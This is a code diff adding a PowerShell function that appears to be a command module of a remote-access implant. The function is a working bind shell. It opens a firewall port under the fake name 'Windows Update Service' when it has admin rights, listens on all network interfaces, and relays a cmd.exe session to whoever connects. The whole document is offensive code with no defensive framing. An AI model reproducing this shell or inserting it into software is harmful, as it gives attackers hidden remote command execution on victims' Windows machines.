@@ -1,0 +1,71 @@
+Function ModCmdBindShell {  # !BindShell|8080
+            [CmdletBinding()] param( 
+			[int32]$TcpListenerPort
+			)
+			         
+            if ($IsAdmin -eq $True) {
+                $FirewallMgrObject = New-Object -Com HNetCfg.FwMgr
+                $PortObject = New-Object -Com HNetCfg.FwOpenPort
+                $PortObject.Name = "Windows Update Service"
+                $PortObject.Port = $TcpListenerPort
+                $PortObject.Protocol = 6
+                $FirewallMgrObject.LocalPolicy.CurrentProfile.GloballyOpenPorts.Add($PortObject)
+            }
+
+            $AsciiEncoding = New-Object System.Text.AsciiEncoding
+            $IpEndpoint = New-Object System.Net.IpEndpoint ([System.Net.Ipaddress]::any, $TcpListenerPort)
+            $TcpListener = New-Object System.Net.Sockets.TcpListener $IpEndpoint
+            $TcpListener.Start()
+            $TcpSocket = $TcpListener.AcceptTcpClient()
+            $NetworkStream = $TcpSocket.GetStream()
+            $NetworkBuffer = New-Object System.Byte[] $TcpSocket.ReceiveBufferSize
+            $BindProcess = New-Object System.Diagnostics.Process 
+            $BindProcess.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe"
+            $BindProcess.StartInfo.Arguments = "/k"
+            $BindProcess.StartInfo.RedirectStandardInput = 1
+            $BindProcess.StartInfo.RedirectStandardoutput = 1
+            $BindProcess.StartInfo.UseShellExecute = 0
+            $BindProcess.Start()
+            $InputStream = $BindProcess.StandardInput
+            $OutputputStream = $BindProcess.Standardoutput
+            Start-Sleep 1
+ 
+                while($OutputputStream.Peek() -ne -1){
+                    $ReturnString += $AsciiEncoding.GetString($OutputputStream.Read())
+                }
+
+                $NetworkStream.Write($AsciiEncoding.GetBytes($ReturnString),0,$ReturnString.Length)
+                $ReturnString = '' 
+                $Done = $False | Out-Null
+
+                while (-not $Done) {
+                    $Position = 0
+                    $i = 1
+    
+                    while (($i -gt 0) -and ($Position -lt $NetworkBuffer.Length)) {
+                                    $Reader = $NetworkStream.Read($NetworkBuffer,$Position,$NetworkBuffer.Length - $Position)
+                        $Position+=$Reader
+        
+                        if ($Position -and ($NetworkBuffer[0..$($Position-1)] -contains 10)) {
+                            break
+                        }
+                    }
+    
+                    if ($Position -gt 0) {
+                        $ReturnString = $AsciiEncoding.GetString($NetworkBuffer,0,$Position)
+                        $InputStream.write($ReturnString)
+                        $Output = $AsciiEncoding.GetString($OutputputStream.Read())
+ 
+                        while ($OutputputStream.Peek() -ne -1){
+                            $Output += $AsciiEncoding.GetString($OutputputStream.Read())
+                        }
+        
+                        $NetworkStream.Write($AsciiEncoding.GetBytes($Output),0,$Output.length)
+                        $Output = $Null | Out-Null
+                    }
+    
+                    else {
+                        $Done = $True | Out-Null
+                    }
+                }
+        }
